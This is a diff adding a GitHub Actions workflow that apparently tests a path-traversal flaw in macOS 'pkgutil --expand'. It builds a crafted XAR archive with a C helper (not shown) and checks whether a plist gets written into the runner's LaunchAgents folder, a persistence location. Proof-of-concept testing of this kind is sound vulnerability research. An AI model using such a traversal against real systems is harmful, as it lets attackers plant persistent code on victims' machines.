@@ -1,0 +1,52 @@
+name: gate_b_run41
+on:
+  workflow_dispatch:
+jobs:
+  gate_b:
+    runs-on: macos-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: GATE B - pkgutil LaunchAgents traversal (run41 fixed header)
+        shell: bash
+        run: |
+          LOG="/tmp/run41_gate_b.log"
+          echo "=== GATE B run41 PRE-CHECK ===" | tee "$LOG"
+          if [ -f /Users/runner/Library/LaunchAgents/xar_gate_b.plist ]; then
+            echo "PRE_PLIST=PRESENT" | tee -a "$LOG"
+          else
+            echo "PRE_PLIST=ABSENT" | tee -a "$LOG"
+          fi
+
+          cc -O2 -Wno-nullability-completeness -o build_xar_r41 build_xar_r41.c -lz 2>&1 | tee -a "$LOG"
+          echo "cc exit: $?" | tee -a "$LOG"
+
+          mkdir -p /tmp/r41_xar
+          ./build_xar_r41 /tmp/r41_xar/gate_b.xar 2>&1 | tee -a "$LOG"
+
+          OUTDIR=$(mktemp -d /tmp/gate_b41_pkgutil.XXXXXX)/out
+          mkdir -p "$OUTDIR"
+          echo "OUTDIR: $OUTDIR" | tee -a "$LOG"
+          echo "Expected: $OUTDIR/../../../../../../Users/runner/Library/LaunchAgents/xar_gate_b.plist" | tee -a "$LOG"
+
+          mkdir -p /Users/runner/Library/LaunchAgents
+
+          pkgutil --expand /tmp/r41_xar/gate_b.xar "$OUTDIR" 2>&1 | tee -a "$LOG" || true
+
+          echo "=== LaunchAgents dir ===" | tee -a "$LOG"
+          ls -la /Users/runner/Library/LaunchAgents/ | tee -a "$LOG"
+
+          echo "=== GATE B CHECK ===" | tee -a "$LOG"
+          if [ -f /Users/runner/Library/LaunchAgents/xar_gate_b.plist ]; then
+            echo "GATE_B_PKGUTIL=PASS" | tee -a "$LOG"
+            cat /Users/runner/Library/LaunchAgents/xar_gate_b.plist | tee -a "$LOG"
+          else
+            echo "GATE_B_PKGUTIL=FAIL" | tee -a "$LOG"
+            exit 1
+          fi
+
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: run41-gate-b-results
+          path: /tmp/run41_gate_b.log
